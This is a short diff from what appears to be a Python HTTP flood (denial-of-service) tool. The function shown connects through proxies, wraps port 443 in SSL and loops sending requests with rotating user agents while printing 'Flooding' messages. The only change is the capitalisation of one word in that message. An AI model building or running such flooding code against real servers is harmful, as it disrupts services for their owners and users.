@@ -117,7 +117,7 @@ def cc(socks_type):
 			s.connect((str(ip), int(port)))
 			if str(port) == '443':
 				s = ssl.wrap_socket(s)
-			print ("[*] "+n+" Flooding from | "+str(proxy[0])+":"+str(proxy[1]))
+			print ("[*] "+n+" Flooding From | "+str(proxy[0])+":"+str(proxy[1]))
 			try:
 				for _ in range(multiple):
 					useragent = "User-Agent: " +getuseragent() + "\r\n"
